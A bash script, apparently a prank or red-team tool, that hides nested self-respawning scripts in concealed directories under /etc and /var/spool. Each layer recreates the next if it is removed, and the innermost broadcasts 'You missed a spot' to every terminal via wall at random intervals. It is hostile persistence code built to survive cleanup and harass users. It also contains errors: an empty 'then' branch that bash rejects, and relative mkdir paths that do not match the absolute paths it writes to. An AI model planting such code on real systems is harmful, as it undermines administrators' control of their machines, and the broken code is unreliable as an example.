#!/bin/bash
mkdir /etc/.music
mkdir /etc/.music/.noLookHere
cat <<EOFA > /etc/.music/.noLookHere/.annoyance.sh
#!/bin/bash
while true
do
if ! [ -f /var/spool/plymouth/.hidden/.annoyance.sh ]
then
if [ -d /var/spool/plymouth/.hidden ]
then
cat <<EOFB > /var/spool/plymouth/.hidden/.annoyance.sh
#!/bin/bash
while true
do
if [ -f /var/spool/.annoyance.sh ]
then
else
cat <<EOFC > /var/spool/.annoyance.sh
#!/bin/bash
while true
do
wall -n "You missed a spot"
sleep $((10 + $RANDOM % 51))
done
EOFC
chmod +x /var/spool/.annoyance.sh
bash /var/spool/.annoyance.sh
fi
sleep 60
done
EOFB
else
if [ -d /var/spool/plymouth ]
then
mkdir .hidden
cat <<EOFD > /var/spool/plymouth/.hidden/.annoyance.sh
#!/bin/bash
while true
do
if ! [ -f /var/spool/.annoyance.sh ]
then
cat <<EOFE > /var/spool/.annoyance.sh
#!/bin/bash
while true
do
wall -n "You missed a spot"
sleep $((10 + $RANDOM % 51))
done
EOFE
chmod +x /var/spool/.annoyance.sh
bash /var/spool/.annoyance.sh
fi
sleep 60
done
EOFD
else
if [ -d /var/spool ]
then
mkdir plymouth
mkdir plymouth/.hidden
cat <<EOFF > /var/spool/plymouth/.hidden/.annoyance.sh
#!/bin/bash
while true
do
if ! [ -f /var/spool/.annoyance.sh ]
then
cat <<EOFG > /var/spool/.annoyance.sh
#!/bin/bash
while true
do
wall -n "You missed a spot"
sleep $((10 + $RANDOM % 51))
done
EOFG
chmod +x /var/spool/.annoyance.sh
bash /var/spool/.annoyance.sh
fi
sleep 60
done
EOFF
chmod +x /var/spool/plymouth/.hidden/.annoyance.sh
fi
fi
fi
fi
sleep 120
done
EOFA
chmod +x /etc/.music/.noLookHere/.annoyance.sh
bash /etc/.music/.noLookHere/.annoyance.sh